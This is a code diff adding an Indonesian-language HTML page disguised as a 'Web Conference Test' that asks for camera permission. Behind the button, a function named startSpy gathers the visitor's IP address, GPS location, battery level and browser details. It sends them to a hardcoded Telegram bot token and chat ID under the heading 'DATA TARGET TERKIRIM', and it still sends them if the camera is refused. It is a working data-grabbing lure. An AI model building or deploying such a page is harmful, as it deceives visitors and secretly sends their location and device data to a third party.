@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Conference Test</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 20px; }
+        #camera { width: 320px; background: #000; margin: 10px auto; }
+        #data { background: #f0f0f0; padding: 15px; margin: 20px; border-radius: 10px; }
+        button { padding: 10px 20px; background: #0088cc; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Web Conference Test</h2>
+    <p>Klik "Izinkan Kamera" untuk memulai konferensi</p>
+    
+    <video id="camera" autoplay></video><br>
+    
+    <div id="data">
+        <p><strong>Informasi Sistem:</strong></p>
+        <p id="ip">Mendeteksi IP...</p>
+        <p id="location">Mendeteksi Lokasi...</p>
+        <p id="battery">Mendeteksi Baterai...</p>
+        <p id="info">Status: Menunggu izin kamera</p>
+    </div>
+    
+    <button onclick="startSpy()">Izinkan Kamera</button>
+    
+    <script>
+        const BOT_TOKEN = "7250621282:AAGFln8EPI5HSEkWFmf1c5aKME-RxihMkY4"; // Ganti dengan token bot Telegram
+        const CHAT_ID = "7619622594"; // Ganti dengan chat ID tujuan
+        
+        let cameraStream = null;
+        let collectedData = {};
+        
+        // Fungsi pengiriman ke Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) { console.error("Telegram error:", e); }
+        }
+        
+        // Ambil IP menggunakan service eksternal
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                collectedData.ip = data.ip;
+                document.getElementById('ip').innerHTML = `IP: <strong>${data.ip}</strong>`;
+                return data.ip;
+            } catch(e) {
+                collectedData.ip = "Tidak terdeteksi";
+                return "Tidak terdeteksi";
+            }
+        }
+        
+        // Ambil lokasi (jika diizinkan)
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const loc = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        collectedData.location = loc;
+                        document.getElementById('location').innerHTML = `Lokasi: <strong>${loc}</strong>`;
+                    },
+                    error => {
+                        collectedData.location = "Akses ditolak";
+                        document.getElementById('location').innerHTML = "Lokasi: Akses ditolak";
+                    }
+                );
+            } else {
+                collectedData.location = "Tidak support";
+            }
+        }
+        
+        // Ambil info baterai
+        function getBattery() {
+            if ('getBattery' in navigator || 'battery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    collectedData.battery = `${Math.floor(battery.level * 100)}%`;
+                    document.getElementById('battery').innerHTML = 
+                        `Baterai: <strong>${Math.floor(battery.level * 100)}%</strong>`;
+                });
+            } else {
+                collectedData.battery = "Tidak support";
+            }
+        }
+        
+        // Ambil info perangkat
+        function getDeviceInfo() {
+            collectedData.userAgent = navigator.userAgent;
+            collectedData.platform = navigator.platform;
+            collectedData.language = navigator.language;
+        }
+        
+        // Format data untuk dikirim
+        function formatData() {
+            return `
+🕵️ <b>DATA TARGET TERKIRIM</b>
+
+📡 <b>IP Address:</b> <code>${collectedData.ip || 'Tidak ada'}</code>
+📍 <b>Lokasi:</b> ${collectedData.location || 'Tidak ada'}
+🔋 <b>Baterai:</b> ${collectedData.battery || 'Tidak ada'}
+🌐 <b>Browser:</b> ${collectedData.userAgent || 'Tidak ada'}
+🗣️ <b>Bahasa:</b> ${collectedData.language || 'Tidak ada'}
+🖥️ <b>Platform:</b> ${collectedData.platform || 'Tidak ada'}
+⏰ <b>Waktu:</b> ${new Date().toLocaleString()}
+            `;
+        }
+        
+        // Fungsi utama
+        async function startSpy() {
+            document.getElementById('info').innerHTML = "Status: Memulai...";
+            
+            // Ambil semua data
+            await getIP();
+            getLocation();
+            getBattery();
+            getDeviceInfo();
+            
+            // Akses kamera
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: false 
+                });
+                document.getElementById('camera').srcObject = cameraStream;
+                document.getElementById('info').innerHTML = "Status: Kamera aktif ✅";
+                
+                // Kirim data ke Telegram
+                setTimeout(async () => {
+                    const message = formatData();
+                    await sendToTelegram(message);
+                    document.getElementById('info').innerHTML += " | Data terkirim ke Telegram ✅";
+                }, 2000);
+                
+            } catch(error) {
+                document.getElementById('info').innerHTML = "Status: Kamera ditolak ❌";
+                collectedData.camera = "Akses ditolak";
+                
+                // Tetap kirim data meski kamera ditolak
+                setTimeout(async () => {
+                    const message = formatData() + "\n📹 <b>Kamera:</b> Akses ditolak";
+                    await sendToTelegram(message);
+                }, 1000);
+            }
+        }
+        
+        // Auto start saat halaman dimuat (optional, bisa diaktifkan)
+        // window.onload = startSpy;
+    </script>
+</body>
+</html>
